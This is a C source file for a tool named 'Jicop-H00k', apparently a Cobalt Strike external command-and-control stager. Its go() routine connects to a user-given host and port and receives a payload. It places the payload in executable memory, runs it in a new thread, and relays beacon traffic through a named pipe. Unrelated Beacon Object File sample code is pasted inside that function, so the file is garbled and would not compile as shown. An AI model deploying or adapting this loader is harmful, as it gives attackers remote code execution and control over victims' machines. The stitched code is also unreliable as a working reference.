/*
 ____________________________________________________________
|                                                            |
|Name : Jicop-H00k                                           |
|Author : S3N4T0R                                            |
|Date : January 23rd 2023                                    |
|____________________________________________________________|
*/

/*
 * Build:
 * i686-w64-mingw32-gcc JicopH00k.c -o JicopH00k.exe -lws2_32
 */

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <dsgetdc.h>
#include <mapi.h>
#pragma argused
#pragma inline
#pragma pack(push,4)
#ifndef HPSS
#define HPSS HANDLE
#endif
#pragma pack(push,4)
#define MiniDumpWithFullMemory 0x00000002
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024
#pragma 
#define STATUS_SUCCESS 0
#define STATUS_UNSUCCESSFUL 0xC0000001
#define STATUS_BUFFER_TOO_SMALL 0xC0000023
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
typedef LONG KPRIORITY;

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )


WINBASEAPI int __cdecl MSVCRT$_wcsicmp(const wchar_t *_Str1, const wchar_t *_Str2);
WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);


WINADVAPI WINBOOL WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemHandleInformation = 16,
	SystemProcessIdInformation = 88
} SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;

typedef enum _OBJECT_INFORMATION_CLASS {
	ObjectBasicInformation = 0,
	ObjectNameInformation = 1,
	ObjectTypeInformation = 2,
	ObjectTypesInformation = 3,
	ObjectHandleFlagInformation = 4,
	ObjectSessionInformation = 5,
	ObjectSessionObjectInformation = 6,
	MaxObjectInfoClass = 7
} OBJECT_INFORMATION_CLASS;


typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation, // q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
	ProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX
	ProcessIoCounters, // q: IO_COUNTERS
	ProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX, VM_COUNTERS_EX2
	ProcessTimes, // q: KERNEL_USER_TIMES
	ProcessBasePriority, // s: KPRIORITY
	ProcessRaisePriority, // s: ULONG
	ProcessDebugPort, // q: HANDLE
	ProcessExceptionPort, // s: PROCESS_EXCEPTION_PORT
	ProcessAccessToken, // s: PROCESS_ACCESS_TOKEN
	ProcessLdtInformation, // qs: PROCESS_LDT_INFORMATION // 10
	ProcessLdtSize, // s: PROCESS_LDT_SIZE
	ProcessDefaultHardErrorMode, // qs: ULONG
	ProcessIoPortHandlers, // (kernel-mode only)
	ProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS
	ProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void
	ProcessUserModeIOPL,
	ProcessEnableAlignmentFaultFixup, // s: BOOLEAN
	ProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS
	ProcessWx86Information,
	ProcessHandleCount, // q: ULONG, PROCESS_HANDLE_INFORMATION // 20
	ProcessAffinityMask, // s: KAFFINITY
	ProcessPriorityBoost, // qs: ULONG
	ProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX
	ProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION
	ProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND
	ProcessWow64Information, // q: ULONG_PTR
	ProcessImageFileName // q: UNICODE_STRING
} PROCESSINFOCLASS;

typedef enum _POOL_TYPE {
	NonPagedPool = 0,
	NonPagedPoolExecute = 0,
	PagedPool = 1,
	NonPagedPoolMustSucceed = 2,
	DontUseThisType = 3,
	NonPagedPoolCacheAligned = 4,
	PagedPoolCacheAligned = 5,
	NonPagedPoolCacheAlignedMustS = 6,
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _SYSTEM_PROCESSES {
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved1[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessId;
} SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;

typedef struct _SYSTEM_PROCESS_ID_INFORMATION {
	HANDLE ProcessId;
	UNICODE_STRING ImageName;
} SYSTEM_PROCESS_ID_INFORMATION, * PSYSTEM_PROCESS_ID_INFORMATION;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _SYSTEM_HANDLE {
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION {
	UNICODE_STRING Name;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccess;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	USHORT MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG PagedPoolUsage;
	ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _API_SET_NAMESPACE {
	ULONG Version;
	ULONG Size;
	ULONG Flags;
	ULONG Count;
	ULONG EntryOffset;
	ULONG HashOffset;
	ULONG HashFactor;
} API_SET_NAMESPACE, * PAPI_SET_NAMESPACE;


typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID IFEOKey;
	PSLIST_HEADER AtlThunkSListPtr;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ProcessPreviouslyThrottled : 1;
			ULONG ProcessCurrentlyThrottled : 1;
			ULONG ProcessImagesHotPatched : 1;
			ULONG ReservedBits0 : 24;
		};
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};
	ULONG SystemReserved;
	ULONG AtlThunkSListPtr32;
	PAPI_SET_NAMESPACE ApiSetMap;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];
	PVOID ReadOnlySharedMemoryBase;
	PVOID SharedData;
	PVOID* ReadOnlyStaticServerData;
	PVOID AnsiCodePageData;
	PVOID OemCodePageData;
	PVOID UnicodeCaseTableData;
	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;
	ULARGE_INTEGER CriticalSectionTimeout;
	SIZE_T HeapSegmentReserve;
	SIZE_T HeapSegmentCommit;
	SIZE_T HeapDeCommitTotalFreeThreshold;
	SIZE_T HeapDeCommitFreeBlockThreshold;
	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID* ProcessHeaps;
	PVOID GdiSharedHandleTable;
	PVOID ProcessStarterHelper;
	ULONG GdiDCAttributeList;
	PRTL_CRITICAL_SECTION LoaderLock;
	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	USHORT OSBuildNumber;
} PEB, * PPEB;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	union
	{
		LIST_ENTRY InInitializationOrderLinks;
		LIST_ENTRY InProgressLinks;
	};
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PROCESS_BASIC_INFORMATION {
	LONG ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	LONG BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR ParentProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

EXTERN_C NTSTATUS ZwQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

EXTERN_C NTSTATUS ZwQueryInformationProcess(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	DWORD ProcessInformationLength,
	PDWORD ReturnLength
	);

EXTERN_C NTSTATUS ZwOpenProcess(
    PHANDLE ProcessHandle, 
    ACCESS_MASK DesiredAccess, 
    POBJECT_ATTRIBUTES ObjectAttributes, 
    PCLIENT_ID ClientId
    );

EXTERN_C NTSTATUS ZwQueryInformationToken(
	HANDLE TokenHandle,
	TOKEN_INFORMATION_CLASS TokenInformationClass,
	PVOID TokenInformation,
	ULONG TokenInformationLength,
	PULONG ReturnLength
	);

EXTERN_C NTSTATUS ZwAdjustPrivilegesToken(
    IN HANDLE TokenHandle,
    IN BOOLEAN DisableAllPrivileges,
    IN PTOKEN_PRIVILEGES TokenPrivileges,
    IN ULONG PreviousPrivilegesLength,
    OUT PTOKEN_PRIVILEGES PreviousPrivileges OPTIONAL,
    OUT PULONG RequiredLength OPTIONAL
    );

EXTERN_C NTSTATUS ZwAllocateVirtualMemory(
    HANDLE ProcessHandle, 
    PVOID *BaseAddress, 
    ULONG_PTR ZeroBits, 
    PSIZE_T RegionSize, 
    ULONG AllocationType, 
    ULONG Protect
    );

EXTERN_C NTSTATUS ZwFreeVirtualMemory(
    HANDLE ProcessHandle, 
    PVOID *BaseAddress, 
    IN OUT PSIZE_T RegionSize, 
    ULONG FreeType
    );

EXTERN_C NTSTATUS ZwReadVirtualMemory(
    HANDLE hProcess, 
    PVOID lpBaseAddress, 
    PVOID lpBuffer, 
    SIZE_T NumberOfBytesToRead, 
    PSIZE_T NumberOfBytesRead
    );

EXTERN_C NTSTATUS ZwWriteVirtualMemory(
    HANDLE hProcess, 
    PVOID lpBaseAddress, 
    PVOID lpBuffer, 
    SIZE_T NumberOfBytesToWrite, 
    PSIZE_T NumberOfBytesWrite
    );

EXTERN_C NTSTATUS ZwDuplicateObject(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);

EXTERN_C NTSTATUS ZwQueryObject(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

EXTERN_C NTSTATUS ZwClose(
    IN HANDLE KeyHandle
    );

typedef NTSTATUS(NTAPI* _NtOpenProcessToken)(
	IN HANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	OUT PHANDLE TokenHandle
	);

typedef PULONG(NTAPI *_RtlSubAuthoritySid)(
	PSID  Sid,
	ULONG SubAuthority
	);

typedef PUCHAR(NTAPI *_RtlSubAuthorityCountSid)(
	_In_ PSID Sid
	);

typedef void (WINAPI* _RtlInitUnicodeString)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

typedef BOOLEAN(NTAPI* _RtlEqualUnicodeString)(
	PUNICODE_STRING String1,
	PCUNICODE_STRING String2,
	BOOLEAN CaseInSensitive
	);


typedef struct {
	char * original;
	char * buffer;   
	int    length;   
	int    size;   
} datap;

DECLSPEC_IMPORT void    BeaconDataParse(datap * parser, char * buffer, int size);
DECLSPEC_IMPORT char *  BeaconDataPtr(datap * parser, int size);
DECLSPEC_IMPORT int     BeaconDataInt(datap * parser);
DECLSPEC_IMPORT short   BeaconDataShort(datap * parser);
DECLSPEC_IMPORT int     BeaconDataLength(datap * parser);
DECLSPEC_IMPORT char *  BeaconDataExtract(datap * parser, int * size);


typedef struct {
	char * original;
	char * buffer;  
	int    length;   
	int    size;     
} formatp;

DECLSPEC_IMPORT void    BeaconFormatAlloc(formatp * format, int maxsz);
DECLSPEC_IMPORT void    BeaconFormatReset(formatp * format);
DECLSPEC_IMPORT void    BeaconFormatAppend(formatp * format, char * text, int len);
DECLSPEC_IMPORT void    BeaconFormatPrintf(formatp * format, char * fmt, ...);
DECLSPEC_IMPORT char *  BeaconFormatToString(formatp * format, int * size);
DECLSPEC_IMPORT void    BeaconFormatFree(formatp * format);
DECLSPEC_IMPORT void    BeaconFormatInt(formatp * format, int value);


#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d

DECLSPEC_IMPORT void   BeaconOutput(int type, char * data, int len);
DECLSPEC_IMPORT void   BeaconPrintf(int type, char * fmt, ...);



DECLSPEC_IMPORT BOOL   BeaconUseToken(HANDLE token);
DECLSPEC_IMPORT void   BeaconRevertToken();
DECLSPEC_IMPORT BOOL   BeaconIsAdmin();


DECLSPEC_IMPORT void   BeaconGetSpawnTo(BOOL x86, char * buffer, int length);
DECLSPEC_IMPORT void   BeaconInjectProcess(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
DECLSPEC_IMPORT void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
DECLSPEC_IMPORT BOOL   BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo);
DECLSPEC_IMPORT void   BeaconCleanupProcess(PROCESS_INFORMATION * pInfo);


DECLSPEC_IMPORT BOOL   toWideChar(char * src, wchar_t * dst, int max);


DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;


	ReadFile(my_handle, (char *)&size, 4, &temp, NULL);


	while (total < size) {
		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}


DWORD recv_frame(SOCKET my_socket, char * buffer, DWORD max) {
	DWORD size = 0, total = 0, temp = 0;


	recv(my_socket, (char *)&size, 4, 0);


	while (total < size) {
		temp = recv(my_socket, buffer + total, size - total, 0);
		total += temp;
	}

	return size;
}


void send_frame(SOCKET my_socket, char * buffer, int length) {
	send(my_socket, (char *)&length, 4, 0);
	send(my_socket, buffer, length, 0);
}

typedef enum {
    PSS_CAPTURE_NONE = 0x00000000,
    PSS_CAPTURE_VA_CLONE = 0x00000001,
    PSS_CAPTURE_RESERVED_00000002 = 0x00000002,
    PSS_CAPTURE_HANDLES = 0x00000004,
    PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008,
    PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010,
    PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020,
    PSS_CAPTURE_HANDLE_TRACE = 0x00000040,
    PSS_CAPTURE_THREADS = 0x00000080,
    PSS_CAPTURE_THREAD_CONTEXT = 0x00000100,
    PSS_CAPTURE_THREAD_CONTEXT_EXTENDED = 0x00000200,
    PSS_CAPTURE_RESERVED_00000400 = 0x00000400,
    PSS_CAPTURE_VA_SPACE = 0x00000800,
    PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00001000,
    PSS_CAPTURE_IPT_TRACE = 0x00002000,
    PSS_CREATE_BREAKAWAY_OPTIONAL = 0x04000000,
    PSS_CREATE_BREAKAWAY = 0x08000000,
    PSS_CREATE_FORCE_BREAKAWAY = 0x10000000,
    PSS_CREATE_USE_VM_ALLOCATIONS = 0x20000000,
    PSS_CREATE_MEASURE_PERFORMANCE = 0x40000000,
    PSS_CREATE_RELEASE_SECTION = 0x80000000
} PSS_CAPTURE_FLAGS;



void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}


void go(char * host, DWORD port) {





	struct sockaddr_in 	sock;
	sock.sin_family = AF_INET;
	sock.sin_addr.s_addr = inet_addr(host);
	sock.sin_port = htons(port);


	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
	if ( connect(socket_extc2, (struct sockaddr *)&sock, sizeof(sock)) ) {
		printf("Could not connect to %s:%d\n", host, port);
		exit(0);
	}

	

	send_frame(socket_extc2, "arch=x86", 8);
	send_frame(socket_extc2, "pipename=foobar", 15);
	send_frame(socket_extc2, "block=100", 9);

	

unsigned char badger_bin[] = {
};


unsigned int badger_bin_len = 0;


WINBASEAPI int WINAPI KERNEL32$lstrlenA (LPCSTR lpString);


int    gCount = 5;
int    gxCount = 0;
char * gBuffer = "abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwx";
char * gStrList[] = {"gggg", "5555", "ssss", "zzzz"};
int    gStrListSize = sizeof(gStrList) / sizeof(char *);



int somefunc(char *src, char *dest, int destLen, int offset) {
   int i;
   for(i = 0; i < destLen && src[i] != 0x0; i++) {
      dest[i] = src[i] + offset;
   }
   ++gCount;
   return i;
}


void printStrList(formatp *buffer, char *name, char **list, int count) {
   BeaconFormatPrintf(buffer, "listName: %s length: %d\n", name, count);
   for (int i = 0; i < count; i++) {
      BeaconFormatPrintf(buffer, "%s[%d] %s\n", name, i, list[i]);
   }
   gxCount++;
}


void go(char * args, int alen) { 
   datap  parser;
   formatp buffer;
   char * str_arg;
   int    num_arg;
   int    result;
   char   stuff1[40] = "AAAAAAAABBBBBBBBCCCCCCCC";
   char   stuff2[20] = { 'Z', 'Z', 'Z', 'Z', 'Z', 'Y', 'Y', 'Y', 'Y', 'Y', 'X', 'X', 'X', 'X', 'X', 'W', 'W', 'W', 'W', 0x0 };
   char * lStrList[] = {"123", "456", "789", "abc"};
   int    lStrListSize = sizeof(lStrList) / sizeof(char *);
   

   BeaconDataParse(&parser, args, alen);
   str_arg = BeaconDataExtract(&parser, NULL);
   num_arg = BeaconDataInt(&parser);


   BeaconFormatAlloc(&buffer, 1024);

   BeaconFormatPrintf(&buffer, "gCount: %d gxGount: %d\n", gCount, gxCount);

   BeaconFormatPrintf(&buffer, "Args[0]: %s Args[1]: %d\n", str_arg, num_arg);

   ++gCount;
   ++gxCount;
   BeaconFormatPrintf(&buffer, "[stuff1 before] %d %s\n", sizeof(stuff1), stuff1);
   result = somefunc(str_arg, stuff1, sizeof(stuff1), 1);
   BeaconFormatPrintf(&buffer, "[stuff1 after ] %d %s\n", result, stuff1);
   BeaconFormatPrintf(&buffer, "gCount: %d gxGount: %d\n", gCount, gxCount);

   BeaconFormatPrintf(&buffer, "[stuff2 before] %d %s\n", sizeof(stuff2), stuff2);
   result = somefunc(stuff2, stuff2, sizeof(stuff2), 1);
   BeaconFormatPrintf(&buffer, "[stuff2 after ] %d %s\n", result, stuff2);

   printStrList(&buffer, "lStrList", lStrList, lStrListSize);
   printStrList(&buffer, "gStrList", gStrList, gStrListSize);

   ++gCount;
   BeaconFormatPrintf(&buffer, "[gBuffer before] %d %s\n", KERNEL32$lstrlenA(gBuffer), gBuffer);
   result = somefunc(stuff1, gBuffer, KERNEL32$lstrlenA(gBuffer), -1);
   BeaconFormatPrintf(&buffer, "[gBuffer after ] %d %s\n", result, gBuffer);
   BeaconFormatPrintf(&buffer, "gCount: %d gxGount: %d\n", gCount, gxCount);



   BeaconPrintf(CALLBACK_OUTPUT, "%s\n", BeaconFormatToString(&buffer, NULL));

} 

void demo(char * args, int length) {
   datap  parser;
   char * str_arg;
   int    num_arg;
   
   BeaconDataParse(&parser, args, length);
   str_arg = BeaconDataExtract(&parser, NULL);
   num_arg = BeaconDataInt(&parser);
   
   BeaconPrintf(CALLBACK_OUTPUT, "Message is %s with %d arg", str_arg, num_arg);
}


	send_frame(socket_extc2, "go", 2);


	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	recv_frame(socket_extc2, payload, PAYLOAD_MAX_SIZE);


	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);

	
	HANDLE handle_beacon = INVALID_HANDLE_VALUE;
	while (handle_beacon == INVALID_HANDLE_VALUE) {
		Sleep(1000);
		handle_beacon = CreateFileA("\\\\.\\pipe\\foobar", GENERIC_READ | GENERIC_WRITE,
			0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
	}


	char * buffer = (char *)malloc(BUFFER_MAX_SIZE); /* 1MB should do */

	
	while (TRUE) {

		DWORD read = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
		if (read < 0) {
			break;
		}


		send_frame(socket_extc2, buffer, read);


		read = recv_frame(socket_extc2, buffer, BUFFER_MAX_SIZE);
		if (read < 0) {
			break;
		}


		write_frame(handle_beacon, buffer, read);
	}


	CloseHandle(handle_beacon);
	closesocket(socket_extc2);
}

void main(DWORD argc, char * argv[]) {

	if (argc != 3) {
		printf("%smessage from jicop-h00k developer [S3N4T0R] set the facking host and port after the executioble\n", argv[0]);
		exit(1);
	}


	WSADATA wsaData;
	WORD    wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);


	go(argv[1], atoi(argv[2]));
}

